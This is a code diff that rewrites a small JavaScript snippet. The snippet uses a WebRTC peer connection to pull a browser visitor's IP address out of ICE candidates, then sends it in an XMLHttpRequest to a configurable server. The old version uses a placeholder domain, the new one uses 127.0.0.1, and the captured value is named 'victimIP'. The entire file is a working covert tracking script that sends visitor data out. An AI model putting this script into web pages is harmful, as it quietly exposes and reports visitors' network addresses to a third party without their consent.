@@ -1,29 +1,38 @@
-// Set up variables
-var IP;
-var url = 'http://myserver.com/'; // CHANGE ME
+/**
+ * update this as needed
+ */
+const ipAddress = '127.0.0.1';
 
-// Get the WebRTC connection, if supported by the browser
-window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection || false;
+// construct the target url
+var url = `http://${ipAddress}/ip=`;
+
+// globally scoped variables
+let victimIP;
+
+// get the WebRTC connection, if supported by the browser
+window.RTCPeerConnection =
+    window.RTCPeerConnection ||
+    window.mozRTCPeerConnection ||
+    window.webkitRTCPeerConnection ||
+    false;
 
 if (window.RTCPeerConnection) {
-    // Create a connection
-    var pc = new RTCPeerConnection({ iceServers: [] }), noop = function () { };
+    // create a connection
+    var pc = new RTCPeerConnection({ iceServers: [] }),
+        noop = function() {};
     pc.createDataChannel('');
     pc.createOffer(pc.setLocalDescription.bind(pc), noop);
 
-    pc.onicecandidate = function (event) {
+    pc.onicecandidate = function(event) {
         if (event && event.candidate && event.candidate.candidate) {
-            // Get the IP address
+            // get the IP address
             var s = event.candidate.candidate.split('\n');
-            IP = s[0].split(' ')[4];
+            victimIP = s[0].split(' ')[4];
 
-            // Construct the payload to send to the server
-            var payload = '?IP=' + IP;
-
-            // Construct and send the request
+            // gonstruct and send the request
             var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open("GET", url + payload, true);
+            xmlHttp.open('GET', url + victimIP, true);
             xmlHttp.send();
         }
-    }
+    };
 }
